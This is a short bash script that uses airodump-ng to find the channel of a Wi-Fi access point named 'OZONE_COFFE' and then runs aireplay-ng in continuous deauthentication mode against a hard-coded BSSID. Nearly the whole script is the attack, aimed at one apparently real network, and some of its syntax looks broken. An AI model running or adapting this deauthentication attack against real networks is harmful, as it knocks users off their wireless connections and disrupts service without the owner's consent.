#!/bin/bash 

if [[ $1 != ]] then 

	airodump-ng --output-format csv -w airodump_output $1  >/dev/null 2>&1 &   
	AIRODUMP_PID=$!
else 
	printf "[-] $1 interface is not in monitor mode"
fi 

sleep 1  
echo "[+] airodump-ng started with PID: $AIRODUMP_PID"

sleep 1  

echo "[*] Scanning for 5 seconds..."
sleep 5

echo "[*] Airmon is monitoring"

BSSID_CHA=$(cat airodump_output-01.csv | head -n  $(grep -n '^[[:space:]]*$' airodump_output-01.csv | cut -d: -f1 | head -n 2 | tail -1) | grep "OZONE_COFFE" | cut -d " " -f7 | cut -d  "," -f1)

if [[ $BSSID_CHA ]] ; then
	echo "[*] AP Channel Found..." 

else 
	echo "[-] AP Channel Not Found..." 
	exit 1  

fi 

BSSID_CHA_DEAUTH=$(aireplay-ng -0 0 -a  08:AA:89:6D:36:A8  $1 -j | cut -d " " -f11 | head -n 1 ) 

while [ $BSSID_CHA != $BSSID_CHA_DEAUTH ] ; 
do 
	 BSSID_CHA_DEAUTH=$(aireplay-ng -0 0 -a  08:AA:89:6D:36:A8  $1 -j | cut -d " " -f11 | head -n 1 ) 
	 echo "[-] Not the Same channel : $BSSID_CHA != $BSSID_CHA_DEAUTH" 
	 continue 
done 

echo "[+] Channel Found " 

rm -rf airodump_output-01.csv 
